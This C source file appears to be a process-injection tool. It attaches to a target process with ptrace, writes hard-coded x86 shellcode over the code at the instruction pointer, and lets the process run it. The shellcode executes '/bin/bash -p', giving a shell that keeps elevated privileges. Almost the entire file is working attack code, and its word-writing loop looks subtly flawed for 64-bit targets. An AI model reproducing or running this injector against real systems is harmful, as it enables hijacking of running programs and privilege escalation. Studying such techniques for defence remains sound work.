// This program uses PTRACE to attach and inject code into a process

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <sys/user.h>
#include <sys/reg.h>

// Function to inject shellcode into process
int inject_shellcode(pid_t pid, unsigned char *src, void *dst, int len) {
  int i;
  uint32_t* s = (uint32_t*) src;
  uint32_t* d = (uint32_t*) dst;
  for(i = 0; i < len; i+=4, s++, d++) {
    if(ptrace(PTRACE_POKETEXT, pid, d, *s) < 0) {
      printf("POKETEXT error\n");
      return -1;
    }
  }
  return 0;
}

int main (int argc, char* argv[]) {
  pid_t target;
  struct user_regs_struct registers;
  int syscall;
  long dst;

  if(argc != 2) {
    printf("Usage:\n\t ./%s <pid>\n", argv[0]);
    exit(1);
  }

  target = atoi(argv[1]);
  // Attach the process
  printf("+ Tracing Process %d\n", target);
  if( ptrace(PTRACE_ATTACH, target, NULL, NULL) < 0) {
    printf("Ptrace error\n");
    exit(1);
  }
  // When ptrace, the target process receives SIGSTOP. wait(NULL) ensures that
  // the parent process waits for the stop to occur
  wait(NULL);

  // Get process registers
  printf("+ Getting Registers\n");
  if(ptrace(PTRACE_GETREGS, target, NULL, &registers) < 0) {
    printf("Ptrace register error\n");
    exit(1);
  }

  // Inject shellcode at rip for 64 bit eip for 32 bit
  printf("+ Injecting Shellcode at %p\n", (void*)registers.rip);
  //char* shellcode = "\x48\x65\x6c\x6c\x6f\x2c\x20\x57\x6f\x72\x6c\x64\x21\x0d\x0a";
  //char* shellcode = "\xef\xbe\xad\xde";
  char* shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70"
		   "\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61"
		   "\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52"
		   "\x51\x53\x89\xe1\xcd\x80";
  int shellcode_size = strlen(shellcode);
  inject_shellcode(target, shellcode, (void*)registers.rip, shellcode_size);
  //registers.rip += 2;

  // Reset the registers in the process
  printf("+ Setting instruction pointer to %p\n", (void*)registers.rip);
  if(ptrace(PTRACE_SETREGS, target, NULL, &registers) < 0) {
    printf("Ptrace register set error\n");
    exit(1);
  }
  printf("+ Run it\n");

  if(ptrace(PTRACE_DETACH, target, NULL, NULL) < 0) { // subtracts 2 from rip
    printf("Ptrace detaching error\n");
    exit(1);
  }

  return 0;
}
